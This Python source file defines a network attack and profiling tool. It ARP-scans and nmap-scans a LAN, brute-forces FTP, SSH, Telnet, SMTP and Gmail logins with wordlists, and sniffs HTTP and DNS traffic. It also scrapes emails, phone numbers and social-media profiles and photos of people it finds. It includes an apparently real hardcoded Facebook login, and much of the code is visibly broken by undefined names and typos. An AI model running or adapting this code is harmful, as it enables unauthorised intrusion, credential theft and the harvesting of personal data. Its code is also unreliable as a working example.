#!/bin/python3

# Predefined modules
import nmap3
import nmap
import psutil
import re
import pwd
import random
import itertools
import subprocess
import os
import requests
import ftplib
import paramiko
import socket
import telnetlib
import smtplib
import poplib
import imaplib
import phonenumbers
import csv
import pandas as pd
import numpy as np
import joblib
import json
import pprint

from threading import Thread
from bs4 import BeautifulSoup
from time import sleep
from collections import defaultdict
from selenium.webdriver import Chrome
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from urllib.request import *
from phonenumbers import carrier,timezone,geocoder
from scapy.all import *
# from sets import *
# Created modules
# from static.modules.packages import *

# Classes
# Hack through wireless
class HACKOUT:
    def __init__(self):
        # Main variable
        self.CHRS="abcdefghijklmnopqrstuvwxyz"
        self.num="0123456789"
        self.sym="!@#$%^&*(){\}[]|:;'<,>.?/"
        self.path='wordlists'
        self.smedia=['facebook.com','twitter.com','linkedin.com','instagram.com','youtube.com','github.com']
        self.about=['/about_overview','/about_work_and_education','/about_places','/about_contact_and_basic_info','/about_family_and_relationships','/about_details','/about_life_events']
        self.thread=[]
        self.iface=[]
        self.interfaces={}
        self.detail=defaultdict(dict)
        self.clientinfo=defaultdict(dict)
        self.dnshosts={}
        self.links=[]
        # Intialize
        self.np3=nmap3.NmapScanTechniques()
        self.options=Options()
        self.options.add_argument('--disable-notifications')
        self.options.add_argument('--no-sandbox')
        self.options.add_argument('--headless')
        # Interface scan
        ifaces=psutil.net_if_addrs()
        for iface in ifaces.keys():
            self.interfaces[iface]=[]
            addrs=ifaces[iface][0].address+' '
            self.interfaces[iface].append(addrs)
            self.interfaces[iface].append(addrs.replace(re.search(r'.\d* ',addrs).group(0),'.1/24'))
        self.iface=['usb0','wlan0','wlan1',True]

    def arp(self):
        return srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=self.interfaces[self.iface[1]][1]),iface=self.iface[1],timeout=1,verbose=False)[0]

    def start(self,ip,mac):
        self.ip,self.mac=ip,mac
        try:
            path='static/logs/system/'+str(self.mac).replace(':','')+'.json'
            self.clientinfo[self.ip]=json.loads(open(path,'r').read())
            self.clientinfo[self.ip]['jpath']=path
        except Exception as e: print('err'+str(e))
        try:
            opath='static/logs/port/'+str(self.mac).replace(':','')+'.json'
            self.clientinfo[self.ip]['other']=json.loads(open(opath,'r').read())
            self.clientinfo[self.ip]['other']['path']=opath
        except Exception as e: print('err'+str(e))
        try:self.clientinfo[self.ip]['evidence']=open('static/logs/evidence/'+str(self.mac).replace(':','')+'.txt')
        except:self.clientinfo[self.ip]['evidence']=None
        self.detail[self.ip]=defaultdict(dict)
        self.nscan3()
        for t in self.thread:
            while t.is_alive(): pass
    
    # Nmap3 scan
    def nscan3(self):
        cinfo,pary={},{}
        osary,acry=[],[]
        try:
            client=self.np3.nmap_tcp_scan(self.ip,args='-p- -A -Pn')[self.ip]
            cinfo['name']=self.handle(client['hostname'],"var[0]['name']")
            cinfo['type']=self.handle(client['hostname'],"var[0]['type']")
            cinfo['ipv4']=self.ip
            cinfo['mac']=self.mac
            for o in client['osmatch']:
                osin={}
                osin['name']=self.handle(o,"var['name']")
                osin['accuracy']=self.handle(o,"var['accuracy']")
                osin['type']=self.handle(o,"var['osclass']['type']")
                osin['osfamily']=self.handle(o,"var['osclass']['osfamily']")
                osin['cpe']=self.handle(o,"var['cpe']")
                acry.append(osin['accuracy'])
                osary.append(osin)
            cinfo['osmatch']=self.handle(osary,"var[self.acry.index(max(list("+str(acry)+")))]")
            for p in client['ports']:
                pin={}
                pin['port']=self.handle(p,"var['portid']")
                pin['name']=self.handle(p,"var['service']['name']")
                pin['product']=self.handle(p,"var['service']['product']")
                pin['version']=self.handle(p,"var['service']['version']")
                pin['reason']=self.handle(p,"var['reason']")
                pin['state']=self.handle(p,"var['state']")
                pin['extrainfo']=self.handle(p,"var['service']['extrainfo']")
                pin['cpe']=self.handle(p,"var['cpe'][0]")
                pin['scripts']=self.handle(p,"var['scripts']")
                pin['warning']=self.analyze(pin['scripts'])
                pary[len(pary)+1]=pin
            cinfo['ports']=pary
            self.detail[self.ip]=cinfo
            open('static/logs/port/'+str(self.mac).replace(':','')+'.json','w').write(json.dumps(cinfo,indent=4))
            # self.hackanalyze(pary)
        except Exception as e: print(e)

    # Script analysis
    def analyze(self,data):
        for d in data:
            if 'anonymous' in d['raw'] or len(d['raw']) > 70: return 'Warning : '+d['raw'] 
        else: return None

    # Hack analysis
    def hackanalyze(self,info):
        for pid in info.keys():
            if info[pid]['name'] in ['ftp']: 
                newt=Thread(target=self.hackftp,args=(info[pid]['port'],))
                newt.start()
                self.thread.append(newt)
            elif info[pid]['name'] in ['ssh']:
                newt=Thread(target=self.hackssh,args=(info[pid]['port'],))
                newt.start()
                self.thread.append(newt)
            elif info[pid]['name'] in ['telnet']:
                newt=Thread(target=self.hacktelnet,args=(info[pid]['port'],))
                newt.start()
                self.thread.append(newt)
            elif info[pid]['name'] in ['smtp']:
                newt=Thread(target=self.hacksmtp,args=(info[pid]['port'],))
                newt.start()
                self.thread.append(newt)
            elif info[pid]['name'] in ['dnsmasq']:
                newt=Thread(target=self.psniff)# Packet analysis
                newt.start()
                self.thread.append(newt)
            elif info[pid]['name'] in ['http','https']:
                newt=Thread(target=self.hackweb,args=(info[pid]['port'],))
                newt.start()
                self.thread.append(newt)
            else: pass

    # FTP hack 21
    def hackftp(self,port):
        ftp=ftplib.FTP()
        ftp.connect(self.ip,int(port))
        for user,passwd in self.AT.wordlist(self.arg):
            try:
                ftp.login(user,passwd)
                self.detail[self.ip]['ftp']={'user':user,'passwd':passwd}
                self.detail[self.ip]['ftp']['data']=self.getftp(ftp,[0])
                self.detail[self.ip]['ftp']['paths']=[]
                self.parseftp(ftp,)
            except Exception as e:print(e) #ftplib.error_perm
        ftp.close()

    def parseftp(self,ftp):
        for f in ftp.nlst():
            print(f)
            try: ftp.cwd(f),self.parseftp(ftp)
            except: self.detail[self.ip]['ftp']['paths'].append(ftp.pwd()+f)

    def getftp(self,ftp,t):
        if t[0]==0: return ftp.dir() # list directory
        elif t[0]==1: return ftp.pwd() # get current directory
        elif t[0]==2: return ftp.cwd(t[1]) # change directory
        elif t[0]==3: return ftp.size(t[1]) # get size of file
        elif t[0]==4: return ftp.retrbinary("RETR "+t[1],open(t[1],'wb').write) # get file from ftp
        elif t[0]==5: return ftp.storbinary("STOR "+t[1],open(t[1],'rb')) # store file to ftp
        else: ftp.sendcmd(t[0])

    # SSH hack 22
    def hackssh(self,port):
        ssh=paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        rsakey="" # changes required
        if rsakey is not None:
            try:
                k=paramiko.RSAKey.from_private_key_file(rsakey) 
                ssh.connect(hostname=self.ip,port=port,key_filename=k,look_for_keys=True,timeout=5000)
                self.detail[self.ip]['ssh']={'key_file':k}
                self.detail[self.ip]['ssh']['data']=ssh.exec_command('ls -alrt')
                self.detail[self.ip]['ssh']['paths']=[]
                self.parsessh(ssh)
            except paramiko.AuthenticationException: pass
        else:
            for user,passwd in self.AT.wordlist(self.arg):
                try:
                    ssh.connect(hostname=self.ip,port=port,password=passwd,username=user,timeout=5000)
                    self.detail[self.ip]['ssh']={'user':user,'passwd':passwd}
                    self.detail[self.ip]['ssh']['data']=ssh.exec_command('ls -alrt')
                    self.detail[self.ip]['ssh']['paths']=[]
                    self.parsessh(ssh)
                except paramiko.AuthenticationException: pass
        ssh.close()
    
    def parsessh(self,ssh):
        for f in ssh.exec_command('ls'):
            try: ssh.exec_command('cd '+f),self.parsessh(ssh)
            except: self.detail[self.ip]['ssh']['paths'].append(ssh.exec_command('pwd')+f)

    # Telnet hack 23
    def hacktelnet(self,port):
        telnet=telnetlib.Telnet(self.ip+':'+str(port))
        telnet.read_until('login: ')
        for user,passwd in self.AT.wordlist(self.arg):
            try:
                telnet.write(user+'\n')
                telnet.write(passwd+'\n')
                self.detail[self.ip]['telnet']={'user':user,'passwd':passwd}
                self.detail[self.ip]['telnet']['data']=self.gettnt(telnet,'ls')
                self.detail[self.ip]['telnet']['paths']=[]
                self.parsetnt(telnet)
            except: pass
        telnet.write('exit\n')

    def getnt(self,telnet,cmd):
        telnet.write(cmd+'\n')
        return telnet.read_all().decode()

    def parsetnt(self,telnet):
        for f in self.gettnt(telnet,'ls\n'):
            try: self.gettnt(telnet,'cd '+f+'\n'),self.parsetnt(telnet,self.ip)
            except: self.detail[self.ip]['telnet']['paths'].append(self.gettnt(telnet,'pwd'+f+'\n'))

    # SMTP hack 25
    def hacksmtp(self,port):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((self.ip,port))
        for user,_ in self.AT.wordlist(self.arg):
            if s.send('VRFY '+user+'\r\n') in ['250','252']: self.detail[self.ip]['smtp']={'user':user}
        s.close()
        smtp=smtplib.SMTP(self.ip,port)
        smtp.ehlo()
        smtp.starttls()
        for _,passwd in self.AT.wordlist(self.arg):
            try:
                smtp.login(self.detail[self.ip]['smtp']['user'],passwd)
                self.detail[self.ip]['smtp']['passwd']=passwd
            except smtplib.SMTPAuthenticationErsmtp: pass
        smtp.quit()

    # DNS hack 53 && Gather information form packets
    def psniff(self):
        self.detail[self.ip]['purls']=defaultdict(list)
        self.detail[self.ip]['pdns']=defaultdict(list)
        sniff(iface=self.iface[1],prn=self.pktscan)

    def pktscan(self,p):
        # HTTP request analysis
        if p.haslayer(http.HTTPRequest):self.detail['purls'][str(p[IP].src)+'-'+str(p[IP].dst)].append(str(p[http.HTTPRequest].HOST+p[http.HTTPRequest].Path)+'\n'+str(self.handle(p,'var[Raw].load')))
        # DNS analysis
        if p.haslayer(DNSRR):self.detail['pdns'][str(p[IP].src)+'-'+str(p[IP].dst)].append(p[DNSQR].qname)

    # http,https hack 80,443 https://hackernoon.com/how-i-hacked-40-websites-in-7-minutes-5b4c28bc8824
    def hackweb(self,port):
        newt=Thread(target=self.dirscan,args=(self.ip,))
        newt.start()
        self.thread.append(newt)
        self.detail[self.ip]['web']={'robots.txt':self.error("requests.get("+self.ip+"/robots.txt')")}
        self.detail[self.ip]['web']['sitemap.xml']=self.error("requests.get("+self.ip+"/sitemap.xml')")
        self.links.append(self.ip)
        for url in self.links:
            try:
                try:
                    try:res=requests.get(url)
                    except:res=requests.get('http://'+url)
                except:requests.get('https://'+url)
                print(url,res)
                soup=BeautifulSoup(res.content,'html5lib')
                link=list(set([a['href'] for a in soup.findAll('a') if a['href']]))
                for smedia in self.smedia:
                    if smedia not in url:
                        buts=soup.findAll('input',type='button')
                        dt={'status_code':res.status_code,'header':res.headers,'encoding':res.encoding,'links':link,'images':list(set([i['src'] for i in soup.findAll('img')])),'contact':self.contact(res),'mail':None,'facebook':None,'github':None,'instagram':None,'linkedin':None,'twitter':None,'youtube':None} #,'content':res.content
                        self.detail[self.ip]['web'][url]=dt
                        self.mailparse(res.content.decode()+'\n'.join(link),url)
                    else:
                        self.smediaparse(smedia,url)
                for l in link:
                    if re.findall(r'^http.*',l):
                        self.links.append(l)
                    else:self.links.append(url+l)
                self.links=list(set(self.links))
            except Exception as e: print(e)

    # Social media parse
    def smediaparse(self,link,url):
        print(link)
        newt=None
        if 'facebook.com' in link:
            newt=Thread(target=self.facebook,args=('6374399577','(#*7$ivanan7*#)',url,))
        elif 'github.com' in link:
            newt=Thread(target=self.github,args=('user','password',url,))
        elif 'instagram.com' in link:
            newt=Thread(target=self.instagram,args=('user','password',))
        elif 'linkedin.com' in link:
            newt=Thread(target=self.linkedin,args=('user','password',))
        elif 'twitter.com' in link:
            newt=Thread(target=self.twitter,args=(url,))
        elif 'youtube.com' in link:
            newt=Thread(target=self.youtube,args=(url,))
        newt.start()
        self.thread.append(newt)

    # Mail pasre
    def mailparse(self,res,url):
        for mail in re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.com", res):
            if mail not in self.detail[self.ip]['web'][url]['mail']:
                self.detail[self.ip]['web'][url]['mail']={mail:None}
                newt=Thread(target=self.gmail,args=(mail,))
                newt.start()
                self.thread.append(newt)

    # directory search
    def dirscan(self,ip):
        print('dir '+str(ip))
        for path in ['index']:#self.AT.wordlist(self.arg):
            try:
                try:res=requests.get(path)
                except:res=requests.get('http://'+ip+'/'+path)
            except:requests.get('https://'+ip+'/'+path)
            if res.status_code=="200":
                self.links.append(ip+'/'+path)
                newt=Thread(target=self.dirscan,args=(ip+'/'+path,))
                newt.start()
                self.thread.append(newt)
    
    # Get contact information
    def contact(self,res):
        c=[]
        for mob in [match.number for match in phonenumbers.PhoneNumberMatcher(res.text,'IN')]:
            x=phonenumbers.parse('+'+str(mob.country_code)+str(mob.national_number),None)
            c.append({'number':str(x.country_code)+str(x.national_number),'name':carrier.name_for_number(x,'en'),'timezone':timezone.time_zones_for_number(x)[0],'country':geocoder.description_for_number(x,'en')})
        return c
        
    # Gmail hack
    def gmail(self,mail):
        smtp=smtplib.SMTP('smtp.gmail.com',587)
        smtp.ehlo()
        smtp.starttls()
        for _,passwd in self.wordlist(self.arg):
            try:
                smtp.login(mail,passwd)
                self.detail[self.ip]['mail'][mail]=passwd
            except smtplib.SMTPAuthenticationErsmtp: pass
        smtp.quit()

    # Get social media information
    def facebook(self,uid,pwd,url):
        browser=Chrome(options=self.options)
        browser.get('https://www.facebook.com/')
        sleep(2)
        userid=browser.find_element_by_id('email')
        passwd=browser.find_element_by_id('pass')
        login=browser.find_element_by_name('login')
        userid.send_keys(uid)
        passwd.send_keys(pwd)
        login.click()
        sleep(2)
        browser.get(url)
        sleep(2)
        # Gather about details
        try:
            name=browser.find_element_by_xpath('/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div/div[1]/div[2]/div/div/div[2]/div/div/div[1]/div/div/div/div/span/h1').text
            userinfo=[]
            links=[]
            for about in self.about:
                try:
                    browser.get(url+about)
                    sleep(2)
                    p=browser.find_element_by_xpath('/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div/div[4]/div/div/div/div[1]/div/div/div/div/div[2]')
                    userinfo.append(p.text)
                    for l in list(set([l.get_attribute('href') for l in p.find_elements_by_tag_name('a') if l.get_attribute('href')])): links.append(l)
                except Exception as e: pass
            self.detail[self.ip]['web'][url]['facebook']={name:muser}
            os.mkdir(name+'_facebook')
            with open(name+'_facebook/'+name+'.txt','w') as fp:
                for info in userinfo: fp.write(info)
            self.detail[self.ip]['web'][url]['facebook']['info']=userinfo
            self.detail[self.ip]['web'][url]['facebook']['contact']=self.contact('\n'.join(userinfo))
            self.mailparse('\n'.join(userinfo)+'\n'.join(links),url)
            for link in links:
                for smedia in self.smedia:
                    if smedia in link and link not in self.links:self.smediaparse(link,url)
            # Gather profile pictures
            try: #people name
                browser.get(browser.find_element_by_xpath('/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div/div[1]/div[2]/div/div/div[1]/div/div/div/a').get_attribute('href')) # profile image link
                sleep(2)
                profile=browser.find_element_by_xpath('/html/body/div[1]/div/div[1]/div/div[4]/div/div/div[1]/div/div[3]/div[2]/div/div[2]/div/div[1]/div/div[2]/div/img').get_attribute('src') # profile image
                sleep(2)
                urlretrieve(profile,name+'_facebook/'+name+'.jpg')
            except Exception as e: pass
            try: # photos xpath 
                browser.get(muser+'/photos')
                picpanel=browser.find_element_by_xpath('/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div/div[4]/div/div/div/div[1]/div/div/div/div/div[3]')
                self.detail[self.ip]['web'][url]['facebook']['img_links']=[pic.get_attribute('href') for pic in picpanel.find_elements_by_tag_name('a')]
                    # urlretrieve(browser.find_element_by_xpath('/html/body/div[1]/div/div[1]/div/div[4]/div/div/div[1]/div/div[3]/div[2]/div/div[2]/div/div[1]/div/div[2]/div/img').get_attribute('src'),name+'_facebook/'+name+str(i)+'.jpg')
            except Exception as e: pass
        except: pass
        browser.quit()

    def github(self,uid,pwd,url):
        browser=Chrome(options=options)
        browser.get('https://github.com/login')
        sleep(2)
        userid=browser.find_element_by_id('login_field')
        passwd=browser.find_element_by_id('password')
        login=browser.find_element_by_name('commit')
        userid.send_keys(uid)
        passwd.send_keys(pwd)
        login.click()
        sleep(2)
        browser.get(url)
        sleep(2)
        try:
            name=browser.find_element_by_xpath('//*[@id="js-pjax-container"]/div[2]/div/div[1]/div/div[2]/div[2]/h1/span[1]').text
            self.detail[self.ip]['web'][url]['github']={name:muser}
            main=browser.find_element_by_tag_name('body')
            links=list(set([l.get_attribute('href') for l in main.find_elements_by_tag_name('a') if l.get_attribute('href')]))
            cont=main.text+'\n'.join(links)
            open(name+'_github/'+name+'.txt','w').write(cont)
            self.detail[self.ip]['web'][url]['github']['contact']=self.contact(cont)
            self.mailparse(cont,url)
            for link in links:
                for smedia in self.smedia:
                    if smedia in link and link not in self.links: 
                        self.links.append(link)
                        self.smediaparse(link,url)
            try:
                minfo=browser.find_element_by_xpath('//*[@id="js-pjax-container"]/div[2]/div/div[2]/div[2]/div/div[1]/div/article')
                os.mkdir(name+'_github')
                open(name+'_github/'+name+'.txt','w').write(minfo.text)
                for i,m in enumerate([src for src in [i.get_attribute('src') for i in minfo.find_elements_by_tag_name('img')] if 'camo.githubusercontent.com' in src]): urlretrieve(m,name+'_github/'+name+str(i)+'.jpg')
            except Exception as e: pass
            self.detail[self.ip]['web'][url]['github']['project']=[{'programming':p.text.split('\n')[-1],'name':p.text.split('\n')[0],'link':p.find_element_by_tag_name('a').get_attribute('href')} for p in browser.find_element_by_tag_name('ol').find_elements_by_tag_name('li')]
            try:
                plink=browser.find_element_by_xpath('//*[@id="js-pjax-container"]/div[2]/div/div[1]/div/div[2]/div[1]/a').get_attribute('href')
                browser.get(plink)
                profile=browser.find_element_by_tag_name('img').get_attribute('src')
                urlretrieve(profile,name+'_github/'+name+'.jpg')
            except Exception as e: pass
        except: pass
        browser.quit()

    def instagram(self,uid,pwd,url):
        browser=Chrome(options=self.options)
        browser=Chrome(r'chromedriver',options=options)
        browser.get('https://www.instagram.com/accounts/login/')
        sleep(2)
        userid=browser.find_element_by_name('username')
        passwd=browser.find_element_by_name('password')
        login=browser.find_element_by_xpath('/html/body/div[1]/section/main/div/div/div[1]/div/form/div/div[3]/button/div')
        userid.send_keys(uid)
        passwd.send_keys(pwd)
        login.click()
        sleep(3)
        browser.get(url)
        sleep(2)
        try:
            name=browser.find_element_by_xpath('/html/body/div[1]/section/main/div/header/section/div[1]/h2').text
            self.detail[self.ip]['web'][url]['instagram']={name:muser}
            self.detail[self.ip]['web'][url]['instagram']['posts']=list(set([l.get_attribute('href') for l in browser.find_element_by_xpath('/html/body/div[1]/section/main/div/div[2]/article').find_elements_by_tag_name('a')]))
        except:pass
        browser.quit()

    def linkedin(self,uid,pwd,url):
        browser=Chrome(options=self.options)
        browser.get('https://www.linkedin.com/login')
        sleep(3)
        userid=browser.find_element_by_id('username')
        passwd=browser.find_element_by_id('password')
        login=browser.find_element_by_xpath('/html/body/div/main/div[2]/div[1]/form/div[3]/button')
        userid.send_keys(uid)
        passwd.send_keys(pwd)
        login.click()
        sleep(3)
        browser.get(url)
        sleep(2)
        try:
            userinfo=[]
            name=browser.find_element_by_xpath('/html/body/div[8]/div[5]/div/div/div/div/div[2]/div/main/div/div[1]/section/div[5]/div[2]/div[1]/ul[1]/li[1]').text
            main=browser.find_element_by_xpath('/html/body/div[8]/div[5]/div/div/div/div/div[2]/div/main/div')
            for m in main.find_elements_by_tag_name('section'):
                userinfo.append(m.text)
            profile=browser.find_element_by_xpath('/html/body/div[8]/div[5]/div/div/div/div/div[2]/div/main/div/div[1]/section/div[5]/div[1]/div[1]/div/div/button/img').get_attribute('src')
            browser.get(muser+'/detail/contact-info/')
            sleep(30)
            links=list(set(c.get_attribute('href') for c in browser.find_element_by_xpath('/html/body/div[4]/div/div/div[2]/section/div/div[1]/div').find_elements_by_tag_name('a')))
            cont='\n'.join(userinfo)+'\n'.join(links)
            self.detail[self.ip]['web'][url]['linkedin']['contact']=self.contact(cont)
            self.mailparse(cont,url)
            for link in links:
                for smedia in self.smedia:
                    if smedia in link and link not in self.links:
                        self.links.append(link)
                        self.smediaparse(link,url)
            os.mkdir(name+'_linkedin')
            open(name+'_linkedin/'+name+'.txt','w').write(cont)
            self.detail[self.ip]['web'][url]['linkedin']={name:muser}
            urlretrieve(profile,name+'_linkedin/'+name+'.jpg')
        except Exception as e: print(e)
        browser.quit()

    def twitter(self,url): # https://twitter.com/siva
        browser=Chrome(options=self.options)
        browser.get(url)
        sleep(3)
        try:
            name=browser.find_element_by_xpath('/html/body/div/div/div/div[2]/main/div/div/div/div[1]/div/div[2]/div/div/div[1]/div[2]/div[2]/div/div/div[1]/div/span[1]/span').text
            main=browser.find_element_by_xpath('/html/body/div/div/div/div[2]/main/div/div/div/div[1]/div')
            cont=browser.find_element_by_xpath('/html/body/div/div/div/div[2]/main/div/div/div/div[1]/div/div[2]/div/div/div[1]/div[2]').text
            tc=browser.find_element_by_xpath('/html/body/div/div/div/div[2]/main/div/div/div/div[1]/div/div[2]/div/div/div[2]/section/div/div')
            twets=[]
            conts=cont
            for twet in tc.find_elements_by_tag_name('article'):
                conts+=twet.text
                twets.append({twet.text:twet.find_element_by_tag_name('img').get_attribute('src')})
            self.detail[self.ip]['web'][url]['twitter']={name:muser}
            links=list(set([l.get_attribute('href') for l in main.find_elements_by_tag_name('a') if l.get_attribute('href')]))
            conts+='\n'.join(links)
            self.detail[self.ip]['web'][url]['twitter']['contact']=self.contact(conts)
            self.mailparse(conts,url)
            for link in links:
                for smedia in self.smedia:
                    if smedia in link and link not in self.links:
                        self.links.append(link)
                        self.smediaparse(link,url)
            os.mkdir(name+'_twitter')
            open(name+'_twitter/'+name+'.txt','w').write(cont+'\n'.join(links))
            open(name+'_twitter/'+name+'twt.txt','w').write('\n'.join(twets))
            # profile
            browser.get(url+'/photo')
            urlretrieve(browser.find_element_by_xpath('/html/body/div/div/div/div[1]/div[2]/div/div/div/div/div/div[2]/div[2]/div[1]/div/div/div/div/div/img'),name+'/'+name+'.jpg')
        except:pass
        browser.quit()

    def youtube(self,url): # https://www.youtube.com/channel/
        browser=Chrome(options=self.options)
        browser.get(url+'/about')
        sleep(3)
        try:
            name=browser.find_element_by_xpath('/html/body/ytd-app/div/ytd-page-manager/ytd-browse[2]/div[3]/ytd-c4-tabbed-header-renderer/app-header-layout/div/app-header/div[2]/div[2]/div/div[1]/div/div[1]').text
            main=browser.find_element_by_xpath('/html/body/ytd-app/div/ytd-page-manager/ytd-browse[2]/ytd-two-column-browse-results-renderer/div[1]/ytd-section-list-renderer/div[2]/ytd-item-section-renderer')
            links=list(set([l.get_attribute('href') for l in main.find_elements_by_tag_name('a') if l.get_attribute('href')]))
            cont=main.text+'\n'.join(links)
            self.detail[self.ip]['web'][url]['youtube']['contact']=self.contact(cont)
            self.mailparse(cont,url)
            for link in links:
                for smedia in self.smedia:
                    if smedia in link and link not in self.links:
                        self.links.append(link)
                        self.smediaparse(link,url)
            os.mkdir(name+'_youtube')
            open(name+'_youtube/'+name+'.txt','w').write(cont)
            self.detail[self.ip]['web'][url]['youtube']={name:muser}
            profile=browser.find_element_by_xpath('/html/body/ytd-app/div/ytd-page-manager/ytd-browse/div[3]/ytd-c4-tabbed-header-renderer/app-header-layout/div/app-header/div[2]/div[2]/div/div[1]/yt-img-shadow/img').get_attribute('src')
            urlretrieve(profile,name+'_youtube/'+name+'.jpg')
        except:pass
        browser.quit()

    # POP3 hack 110 ,https://www.shellhacks.com/retrieve-email-pop3-server-command-line/
    def hackpop3(self): pass

    # Windows RPC hack 135
    def hackwinrpc(self): pass

    # windows netbios over tcp/ip hack 137-139
    def hackwinnet(self): pass

    # Microsoft SQL server hack 1433 and 1434
    def hacksql(self): pass

    # common functions
    # Download wordlist
    def dwordlists(self):
        wname=['apache-user-enum-1.0.txt','apache-user-enum-2.0.txt','directory-list-1.0.txt','directory-list-2.3-big.txt','directory-list-2.3-medium.txt','directory-list-2.3-small.txt','directory-list-lowercase-2.3-big.txt','directory-list-lowercase-2.3-medium.txt','directory-list-lowercase-2.3-small.txt']
        os.system('curl -L -o '+self.path+'/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt')
        for name in wname: os.system('curl -L -o '+self.path+'/'+name+' https://github.com/daviddias/node-dirbuster/tree/master/lists/'+name)

    # Wordlist generator
    def wordlist(self):
        wrdlst=[os.path.join(self.path,fname) for fname in [f for r,d,f in os.walk('wordlists/')][0]][self.arg.wrdlstoption]
        if wrdlst==[]: 
            self.dwordlists()
            wrdlst=[os.path.join(self.path,fname) for fname in [f for r,d,f in os.walk('wordlists/')][0]][self.arg.wrdlstoption]
        for wrd in open(wrdlst,'rb').readlines(): yield wrd.decode().strip()
        CHRS=self.CHRS[:self.CHRS.index(self.arg.c)]
        num=self.num[:self.num.index(self.arg.n)]
        sym=self.sym[:self.sym.index(self.arg.s)]
        final=num+CHRS+CHRS.upper()+sym
        for x in itertools.product(self.final,repeat=self.arg.l): yield ''.join(x)
        # for w in BASIC().wordlist(4,'3','b','@'): print(w)

    def handle(self,var,val):
        try: return eval(val)
        except: return None

    def error(self,code):
        try: return eval(code)
        except: pass

# Security script
class SECURE:
    def __init__(self,path):
        self.passwd=""

    # Secure password maker
    def passwdgen(self,ud):
        self.CHRS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        self.num="0123456789"
        self.sym="!@#$%^&*(){\}[]|:;'<,>.?/"
        for c in ud:
            self.CHRS=self.CHRS.replace(c,"")
            self.num=self.num.replace(c,"")
            self.sym=self.sym.replace(c,"")
        for i in range(8):
            for c in random.choices([self.CHRS,self.num,self.sym,ud]):
                self.passwd+=random.choice(c)

# HACK=HACKOUT()
# for i,ans in enumerate(HACK.arp()):HACK.start(ans[i].psrc,ans[i].hwsrc)
# pprint.pprint(HACK.detail)